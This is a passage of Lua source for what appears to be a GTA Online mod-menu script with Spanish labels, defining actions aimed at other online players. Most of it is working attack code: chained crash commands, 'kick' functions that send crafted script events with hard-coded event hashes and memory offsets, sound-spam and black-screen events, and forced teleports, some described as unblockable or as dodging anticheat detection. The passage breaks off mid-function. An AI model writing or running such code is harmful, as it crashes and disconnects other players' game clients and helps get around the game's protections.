            util.yield(500)
            menu.trigger_commands("crashv97"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv84"..players.get_name(player_id))
            util.yield(700)
            menu.trigger_commands("crashv51"..players.get_name(player_id))
            --util.yield(400)
            --menu.trigger_commands("crashv5"..players.get_name(player_id))
            --util.yield(400)
            --menu.trigger_commands("crashv6"..players.get_name(player_id))
            --util.yield(400)
            --menu.trigger_commands("crashv7"..players.get_name(player_id))
            -- Turned off because of a self-crash error
            --util.yield(600)
            --menu.trigger_commands("crashv4"..players.get_name(player_id))
            util.yield(2000)
            menu.trigger_commands("crash"..players.get_name(player_id))
            util.yield(200)
            menu.trigger_commands("ngcrash"..players.get_name(player_id))
            util.yield(400)
            menu.trigger_commands("footlettuce"..players.get_name(player_id))
            util.yield(700)
            menu.trigger_commands("steamroll"..players.get_name(player_id))
            menu.trigger_commands("choke"..players.get_name(player_id))
            util.yield(200)
            menu.trigger_commands("flashcrash"..players.get_name(player_id))
            util.yield(1800)
            util.toast("Espera en lo que se limpia todo...")
            --menu.trigger_command(outSync, "off")
            menu.trigger_commands("rlag3"..players.get_name(player_id))
            menu.trigger_commands("rcleararea")
            menu.trigger_commands("potatomode off")
            menu.trigger_commands("trafficpotato off")
            util.yield(8000)
            menu.trigger_commands("anticrashcamera off")
        end)
    end

    if menu.get_edition() >= 3 then
        menu.action(crashes, "Bomba Del Tsar Especial (Modelo)", {"tsarbomba5"}, "Crash demandante de pc, si no tienes buena pc no te recomiendo usarlo (Inbloqueable uwu) \n(Necesita Regular Para Funcionar Bien/ Muy Posible Overload)", function()
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            --local outSync = menu.ref_by_path("Outgoing Syncs>Block")
            menu.trigger_commands("anticrashcamera on")
            menu.trigger_commands("potatomode on")
            menu.trigger_commands("trafficpotato on")
            util.toast("Iniciando...")
            util.toast("Pobre man")
            menu.trigger_commands("rlag3"..players.get_name(player_id))
            util.yield(2500)
            menu.trigger_commands("crashv27"..players.get_name(player_id))
            util.yield(620)
            menu.trigger_commands("crashv18"..players.get_name(player_id))
            util.yield(620)
            menu.trigger_commands("crashv12"..players.get_name(player_id))
            util.yield(820)
            menu.trigger_commands("crashv10"..players.get_name(player_id))
            util.yield(620)
            menu.trigger_commands("crashv5"..players.get_name(player_id))
            util.yield(620)
            menu.trigger_commands("crashv4"..players.get_name(player_id))
            util.yield(620)
            menu.trigger_commands("crashv1"..players.get_name(player_id))
            util.yield(720)
            menu.trigger_commands("crashv13"..players.get_name(player_id))
            util.yield(720)
            menu.trigger_commands("crashv14"..players.get_name(player_id))
            -- Turned off because of a self-crash error
            --util.yield(600)
            --menu.trigger_commands("crashv4"..players.get_name(player_id))
            util.yield(2800)
            menu.trigger_commands("crash"..players.get_name(player_id))
            util.yield(550)
            menu.trigger_commands("ngcrash"..players.get_name(player_id))
            util.yield(550)
            menu.trigger_commands("footlettuce"..players.get_name(player_id))
            util.yield(550)
            menu.trigger_commands("steamroll"..players.get_name(player_id))
            util.yield(550)
            menu.trigger_commands("choke"..players.get_name(player_id))
            util.yield(550)
            menu.trigger_commands("flashcrash"..players.get_name(player_id))
            util.yield(200)
            --menu.trigger_commands("pipebomb"..players.get_name(player_id)) Posible Anticheat Concerns
            util.yield(400)
            menu.trigger_commands("smash"..players.get_name(player_id))
            if PLAYER.GET_VEHICLE_PED_IS_IN(ped, false) then
                menu.trigger_commands("slaughter"..players.get_name(player_id))
            end
            util.yield(1500)
            util.toast("Espera en lo que se limpia todo...")
            --menu.trigger_command(outSync, "off")
            menu.trigger_commands("rlag3"..players.get_name(player_id))
            menu.trigger_commands("rcleararea")
            menu.trigger_commands("potatomode off")
            menu.trigger_commands("trafficpotato off")
            util.yield(8000)
            menu.trigger_commands("anticrashcamera off")
        end)
    end

    -- Structure premade for the next crash


    --menu.action(crashes, "Test", {}, "", function()
        --BlockSyncs(player_id, function()
        
        --end)
    
    
    
    --end)

    local kicks = menu.list(malicious, "Kicks", {}, "")

    if menu.get_edition() >= 2 then 
        menu.action(kicks, "Kickeo Adaptivo", {}, "", function()
            util.trigger_script_event(1 << player_id, {915462795, player_id, 1, 0, 2, player_id, 2700359414448})
            util.trigger_script_event(1 << player_id, {1268038438, player_id, -1018058175, player_id, -1125813865, player_id, -1113136291, player_id, -2123789977})
            util.trigger_script_event(1 << player_id, {243072129, player_id, 1, 0, 2, math.random(13, 257), 3, 1})
            menu.trigger_commands("breakup" .. players.get_name(player_id))
        end)
    else
        menu.action(kicks, "Kickeo adaptivo V2", {}, "", function()
            util.trigger_script_event(1 << player_id, {915462795, player_id, 1, 0, 2, player_id, 2700359414448})
            util.trigger_script_event(1 << player_id, {1268038438, player_id, -1018058175, player_id, -1125813865, player_id, -1113136291, player_id, -2123789977})
            util.trigger_script_event(1 << player_id, {243072129, player_id, 1, 0, 2, math.random(13, 257), 3, 1})
        end)
    end

    menu.action(kicks, "Kickeo Poderoso", {}, "", function()
        util.trigger_script_event(1 << player_id, {697566862, player_id, 0x4, -1, 1, 1, 1}) --697566862 Give Collectible
        util.trigger_script_event(1 << player_id, {1268038438, player_id, memory.script_global(2657589 + 1 + (player_id * 466) + 321 + 8)}) 
        util.trigger_script_event(1 << player_id, {915462795, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (player_id * 0x257) + 0x1FE))})
        util.trigger_script_event(1 << player_id, {697566862, player_id, 0x4, -1, 1, 1, 1})
        util.trigger_script_event(1 << player_id, {1268038438, player_id, memory.script_global(2657589 + 1 + (player_id * 466) + 321 + 8)})
        util.trigger_script_event(1 << player_id, {915462795, players.user(), memory.read_int(memory.script_global(1894573 + 1 + (player_id * 608) + 510))})
    end)

    local sekicks = menu.list(kicks, "Kickeos Por Scripts", {}, "")

    menu.action(sekicks, "Script kick v1", {}, "Inbloqueable por stand.", function()
        util.trigger_script_event(1 << player_id, {243072129, player_id, 1, 0, 2, math.random(13, 257), 3, 1})
    end)

    menu.action(sekicks, "Script kick v2", {}, "", function()
        util.trigger_script_event(1 << player_id, {1268038438, player_id, -1018058175, player_id, -1125813865, player_id, -1113136291, player_id, -2123789977})
    end)

    menu.action(sekicks, "Script kick v3", {}, "", function()
        util.trigger_script_event(1 << player_id, {915462795, player_id, 1, 0, 2, player_id, 2700359414448})
    end)

    menu.action(sekicks, "Script kick v4", {}, "", function()
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-168599209, 4, -106354710, 1957299332, 1, 115, 2037557198, -1322654879, -1220141674, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-168599209, 4, -106354710, 1957299332, 1, 115, 2037557198, -1322654879, -1220141674})
        end
        util.yield(50)
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-168599209, 4, -106354710, 1957299332, 1, 115, 2037557198, -1322654879, -1220141674, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-168599209, 4, -106354710, 1957299332, 1, 115, 2037557198, -1322654879, -1220141674})
            util.trigger_script_event(1 << player_id, {-168599209, 4, -106354710, 1957299332, 1, 115, 2037557198, -1322654879, -1220141674})
        end
    end)

    menu.action(sekicks, "Script kick v5", {}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-168599209, 4, 827588970, 828619960, 1, 115, 330139908, -2089816692, -2142984085, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-168599209, 4, 827588970, 828619960, 1, 115, 330139908, -2089816692, -2142984085})
        end
        util.yield(50)
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-168599209, 4, 827588970, 828619960, 1, 115, 330139908, -2089816692, -2142984085, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-168599209, 4, 827588970, 828619960, 1, 115, 330139908, -2089816692, -2142984085})
            util.trigger_script_event(1 << player_id, {-168599209, 4, 827588970, 828619960, 1, 115, 330139908, -2089816692, -2142984085})
        end
    end)

    menu.action(kicks, "Desync Kick 'Test'", {}, "", function() 
        util.trigger_script_event(1 << player_id, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (player_id * 0x257) + 0x1FE))})
    end)

    menu.action(kicks, "Kickeo Modo Historia 'Test'", {}, "", function() 
        util.trigger_script_event(1 << player_id, {111242367, player_id, memory.script_global(2689235 + 1 + (player_id * 453) + 318 + 7)})
    end)

    menu.action(kicks, "Kickeo Figura Invalida", {}, "", function() 
        util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x4, -1, 1, 1, 1})
    end)

    --menu.action(kicks, "Desync Kick", {}, "", function()
    --   local model = util.joaat("MP_M_Freemode_01")
    --    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    --    local ped_ = entities.create_ped(1, model, pos, 0, true, false)
    --    PED.SET_PED_COMPONENT_VARIATION(ped_, 0, 0, 0, 39, 0)
    --    PED.SET_PED_COMPONENT_VARIATION(ped_, 1, 104, 25, -1, 0)
    --    PED.SET_PED_COMPONENT_VARIATION(ped_, 2, 49, 0, -1, 0)
    --    PED.SET_PED_COMPONENT_VARIATION(ped_, 3, 33, 0, 0)
    --    PED.SET_PED_COMPONENT_VARIATION(ped_, 4, 84, 0, 0)
    --    PED.SET_PED_COMPONENT_VARIATION(ped_, 5, 82, 0, 0)
    --    PED.SET_PED_COMPONENT_VARIATION(ped_, 6, 33, 0, 0)
    --    PED.SET_PED_COMPONENT_VARIATION(ped_, 7, 0, 0, 0)
    --    PED.SET_PED_COMPONENT_VARIATION(ped_, 8, 97, 0, 0)
    --    PED.SET_PED_COMPONENT_VARIATION(ped_, 9, 0, 0, 0)
    --    PED.SET_PED_COMPONENT_VARIATION(ped_, 10, 0, 0, 0)
    --    PED.SET_PED_COMPONENT_VARIATION(ped_, 11, 186, 0, 0)
    --    util.trigger_script_event(-227800145 << player_id, {player_id, math.random(32, 23647483647), math.random(-23647, 212347), 1, 115, math.random(-2321647, 21182412647), math.random(-2147483647, 2147483647), 26249, math.random(-1257483647, 23683647), 2623, 25136})
    --end)

    local especialev = menu.list(malicious, "Eventos Especiales", {}, "Eventos descubiertos recientemente. \nNo abusar de ellos.")

    --[[
            menu.action(especialev, "Remote CrashKick 'Test'", {}, "", function()
        for i = 1, 5 do
            util.trigger_script_event(1 << player_id, {-957260626, player_id, memory.script_global(1669394 + 1 + (player_id * 792))}) 
            util.trigger_script_event(1 << player_id, {-957260626, player_id, memory.script_global(1669394 + 1 + (player_id * 504))}) 
            util.trigger_script_event(1 << player_id, {-957260626, player_id, memory.script_global(1669394 + 1 + (player_id * 642))}) 
            util.trigger_script_event(1 << player_id, {-957260626, player_id, memory.script_global(1669394 + 1 + (player_id * 657))}) 
            util.trigger_script_event(1 << player_id, {-957260626, player_id, memory.script_global(1669394 + 1 + (player_id * 557))}) 
            util.trigger_script_event(1 << player_id, {-957260626, player_id, memory.script_global(1669394 + 1 + (player_id * 634))}) 
            util.trigger_script_event(1 << player_id, {-957260626, player_id, memory.script_global(1669394 + 1 + (player_id * 844))}) 
            util.trigger_script_event(1 << player_id, {-957260626, player_id, memory.script_global(1669394 + 1 + (player_id * 485))}) 
            util.trigger_script_event(1 << player_id, {-957260626, player_id, memory.script_global(1669394 + 1 + (player_id * 849))})
        end
    end)

    menu.action(especialev, "Remote ILS 'Test'", {}, "(Infinite Loading Screen)", function()
        for i = 1, 6 do
            util.trigger_script_event(1 << player_id, {-957260626, player_id, memory.script_global(1669394 + 1 + (player_id * 553))})
            util.trigger_script_event(1 << player_id, {-957260626, player_id, memory.script_global(1669394 + 1 + (player_id * 682))})
        end
    end)

    menu.action(especialev, "Remote PasiveMode 'Test'", {}, "", function()
        for i = 1, 8 do
            util.trigger_script_event(1 << player_id, {-957260626, player_id, memory.script_global(1669394 + 1 + (player_id * 602))})
        end
    end)
    
    menu.action(especialev, "Remote TE 'Test'", {}, "(Transaction Error)", function()
        for i = 1, 8 do
            util.trigger_script_event(1 << player_id, {-957260626, player_id, memory.script_global(1669394 + 1 + (player_id * 403))})
        end
    end)

    menu.action(especialev, "Remote GMODE 'Test'", {}, "", function()
        for i = 1, 8 do
            util.trigger_script_event(1 << player_id, {-957260626, player_id, memory.script_global(1669394 + 1 + (player_id * 2))})
        end
    end)

    menu.action(especialev, "Remote Payout 'Test'", {}, "(Will give them the GoodSport payout)", function()
        for i = 1, 2 do
            util.trigger_script_event(1 << player_id, {-957260626, player_id, memory.script_global(1669394 + 1 + (player_id * 85))})
        end
    end)
    ]]


    local scriptev = menu.list(malicious, "Eventos", {}, "Eventos causados por scripts. \nAquellos con mod menu de paga podran detectarte.")

    menu.action(scriptev, "Errape 1", {}, "Ejecutara unos eventos que haran que muchas personas escuchen el sonido. \nLas personas con un mod menu de paga te detectaran.", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            menu.trigger_commands("scripthost")
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "LOSER", pc.x, pc.y, pc.z, "HUD_AWARDS", true, 9999, false)
            end
            util.yield_once()
        end
    end)
    
    menu.action(scriptev, "Errape 2", {}, "Ejecutara unos eventos que haran que muchas personas escuchen el sonido. \nLas personas con un mod menu de paga te detectaran.", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            menu.trigger_commands("scripthost")
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "1st_Person_Transition", pc.x, pc.y, pc.z, "PLAYER_SWITCH_CUSTOM_SOUNDSET", true, 9999, false)
            end
            util.yield_once()
        end
    end)

    menu.action(scriptev, "Errape 3", {}, "Ejecutara unos eventos que haran que muchas personas escuchen el sonido. \nLas personas con un mod menu de paga te detectaran.", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            menu.trigger_commands("scripthost")
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Hit", pc.x, pc.y, pc.z, "RESPAWN_ONLINE_SOUNDSET", true, 9999, false)
            end
            util.yield_once()
        end
    end)

    menu.action(scriptev, "Errape 4", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", pc.x, pc.y, pc.z, "DLC_sum20_Business_Battle_AC_Sounds", true, 9999, false)
            end
            util.yield_once()
        end
    end)

    local antimodder = menu.list(malicious, "Anti-Modder", {}, "")
    local kill_godmode = menu.list(antimodder, "Matar jugador con godmode", {}, "")
    menu.action(kill_godmode, "Stun", {""}, "Funciona en menus que usan a prueba de:", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 99999, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
    end)

    menu.slider_text(kill_godmode, "Aplastamiento", {}, "", {"Khanjali", "APC"}, function(index, veh)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        local vehicle = util.joaat(veh)
        ryze.request_model(vehicle)

        switch veh do
            case "Khanjali":
            height = 2.8
            offset = 0
            break
            case "APC":
            height = 3.4
            offset = -1.5
            break
        end

        if TASK.IS_PED_STILL(ped) then
            distance = 0
        elseif not TASK.IS_PED_STILL(ped) then
            distance = 3
        end

        local vehicle1 = entities.create_vehicle(vehicle, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, offset, distance, height), ENTITY.GET_ENTITY_HEADING(ped))
        local vehicle2 = entities.create_vehicle(vehicle, pos, 0)
        local vehicle3 = entities.create_vehicle(vehicle, pos, 0)
        local vehicle4 = entities.create_vehicle(vehicle, pos, 0)
        local spawned_vehs = {vehicle4, vehicle3, vehicle2, vehicle1}
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, false)
        util.yield(5000)
        for i = 1, #spawned_vehs do
            entities.delete_by_handle(spawned_vehs[i])
        end
    end)   

    player_toggle_loop(antimodder, player_id, "Remover godmode", {}, "Lo blokean muchos", function()
        util.trigger_script_event(1 << player_id, {0xAD36AA57, player_id, 0x96EDB12F, math.random(0, 0x270F)})
    end)

    player_toggle_loop(antimodder, player_id, "Arma anti-godmode", {}, "", function()
        for _, player_id in ipairs (players.list(true, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            if PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(players.user(), ped) and players.is_godmode(player_id) then
                util.trigger_script_event(1 << player_id, {0xAD36AA57, player_id, 0x96EDB12F, math.random(0, 0x270F)})
            end
        end
    end)

    --player_toggle_loop(antimodder, player_id, "Remover godmode de carro", {}, "", function()
    --    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    --    if PED.IS_PED_IN_ANY_VEHICLE(ped, false) and not PED.IS_PED_DEAD_OR_DYING(ped) then
    --        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
    --        ENTITY.SET_ENTITY_CAN_BE_DAMAGED(veh, true)
    --        ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
    --        ENTITY.SET_ENTITY_PROOFS(veh, false, false, false, false, false, 0, 0, false)
    --    end
    --end)

    --menu.action(antimodder, "Remover godmode de carro V2", {}, "", function()
    --    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    --    local veh = PED.GET_VEHICLE_PED_IS_IN(p)
    --    if PED.IS_PED_IN_ANY_VEHICLE(p) then
    --        RequestControl(veh)
    --        ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
    --    else
    --        util.toast(players.get_name(player_id).. " No esta en un coche")
    --    end
    --end)

    --menu.toggle_loop(antimodder, "Remover godmode de carro V3", {}, "", function()
    --    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    --    local veh = PED.GET_VEHICLE_PED_IS_IN(p)
    --    if PED.IS_PED_IN_ANY_VEHICLE(p) then
    --        RequestControl(veh)
    --        ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
    --    else
    --        util.toast(players.get_name(player_id).. " No esta en un coche")
    --    end
    --end)

    menu.action(trolling, "Pantalla Negra", {}, "", function()
        util.trigger_script_event(1 << player_id, {879177392, player_id, math.random(1, 32), 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(player_id), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        util.yield(1000)
    end)

    --[[
        menu.action(trolling, ("Enviar Mercenarios"), {}, "", function()
        if NETWORK.NETWORK_IS_SESSION_STARTED() and NETWORK.NETWORK_IS_PLAYER_ACTIVE(player_id) and
        not PED.IS_PED_INJURED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)) and not ryze.is_player_in_interior(player_id) then
    
            if not NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 1, true, 0) then
                local bits_addr = memory.script_global(1853910 + (players.user() * 862 + 1) + 140)
                memory.write_int(bits_addr, memory.write_byte(memory.read_int(bits_addr), 1))
                write_global.int(1853348 + (players.user() * 862 + 1) + 141, player_id)
            else
                util.toast("Ya lo siguen los mercenarios")
            end
        end
    end) 
    ]]

    menu.action(trolling, "Enviar Al Bote", {}, "", function()
        local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
        local my_ped = PLAYER.GET_PLAYER_PED(players.user())
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, 1628.5234, 2570.5613, 45.56485, true, false, false)
        menu.trigger_commands("givesh " .. players.get_name(player_id))
        menu.trigger_commands("summon " .. players.get_name(player_id))
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("otr")
        util.yield(5000)
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("otr")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z)
    end)

    menu.action(trolling, "Matar en interior", {}, "Funciona :b", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
    
        for i, interior in ipairs(interior_stuff) do
            if ryze.get_interior_of_player(player_id) == interior then
                util.toast("Jugador no esta en interior. D:")
            return end
            if ryze.get_interior_of_player(player_id) ~= interior then
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 1000, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
            end
        end
    end)

    local function GiveWeapon(attacker)
        if (weapon0 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(unarmed, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, unarmed, 1, false, true)
        elseif (weapon1 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(machete, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, machete, 1, false, true)
        elseif (weapon2 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(pistol, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, pistol, 1, false, true)
        elseif (weapon3 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(stungun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, stungun, 1, false, true)
        elseif (weapon4 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(atomizer, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, atomizer, 1, false, true)
        elseif (weapon5 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(shotgun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, shotgun, 1, false, true)
        elseif (weapon6 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(sniper, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, sniper, 1, false, true)
        elseif (weapon7 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(microsmg, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, microsmg, 1, false, true)
        elseif (weapon8 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(minigun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, minigun, 1, false, true)
        elseif (weapon9 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(RPG, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, RPG, 1, false, true)
        elseif (weapon10 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(hellbringer, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, hellbringer, 1, false, true)
        elseif (weapon11 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(railgun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, railgun, 1, false, true)
        end
    end

    local function setAttribute(attacker)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 38, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 5, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 0, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 12, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 22, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 54, true)
        PED.SET_PED_COMBAT_RANGE(attacker, 4)
        PED.SET_PED_COMBAT_ABILITY(attacker, 3)
    end

    local pclpid = {}

    menu.action(trolling, "Clonar", {}, "Clona al jugador.", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        aclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0) --spawn clone
        PED.CLONE_PED_TO_TARGET(p, aclone)
        GiveWeapon(aclone)
        setAttribute(aclone)
        TASK.TASK_COMBAT_PED(aclone, p, 0, 16)
        if (isImmortal == true) then
            ENTITY.SET_ENTITY_CAN_BE_DAMAGED(aclone, false)
        end
    end)

    --menu.action(trolling, "Chop 'Test'", {}, "Saca un chop", function()
    --    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    --    local c = ENTITY.GET_ENTITY_COORDS(p)
    --    STREAMING.REQUEST_MODEL(chop)
    --    while not STREAMING.HAS_MODEL_LOADED(chop) do
    --        STREAMING.REQUEST_MODEL(chop)
    --        util.yield()
    --    end
    --    local achop = entities.create_ped(26, chop, c, 0) --spawn chop
    --    TASK.TASK_COMBAT_PED(achop , p, 0, 16)
    --    setAttribute(achop)
    --    if (isImmortal == true) then
    --        ENTITY.SET_ENTITY_CAN_BE_DAMAGED(achop , false)
    --    end
    --    if not STREAMING.HAS_MODEL_LOADED(chop) then
    --        util.toast("No se puede cargar el modelo")
    --    end
    --end)

    menu.action(trolling, "Teletransportar a los backrooms", {}, "Les teletransporta a los backrooms", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p, true)
        local defx = c.x
        local defy = c.y 
        local defz = c.z
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, true)
        if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
            STREAMING.REQUEST_MODEL(floorbr)
            while not STREAMING.HAS_MODEL_LOADED(floorbr) do
                STREAMING.REQUEST_MODEL(floorbr)
                util.yield()
            end
            STREAMING.REQUEST_MODEL(wallbr)
            while not STREAMING.HAS_MODEL_LOADED(wallbr) do
                STREAMING.REQUEST_MODEL(wallbr)
                util.yield()
            end
            RequestControl(veh)
            local success, floorcoords
            repeat
                success, floorcoords = util.get_ground_z(c.x, c.y)
                util.yield()
            until success
            c.z = floorcoords - 100
            ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, c.z, false, false, false, false)

            local c = ENTITY.GET_ENTITY_COORDS(p)
            local defz = c.z
            c.z = defz - 2
            local spawnedfloorbr = entities.create_object(floorbr, c)
            c.z = c.z + 10
            local spawnedroofbr = entities.create_object(floorbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedroofbr, 180.0, 0.0, 0.0, 1, true)

            defz = c.z - 5
            c.x = c.x + 4
            c.z = defz
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 8
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 8
            c.x = defx + 10.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 14.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 7.2
            c.x = defx + 3.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = defy + 6.5
            c.x = defx + 11
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = defx - 12
            c.y = defy + 4
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
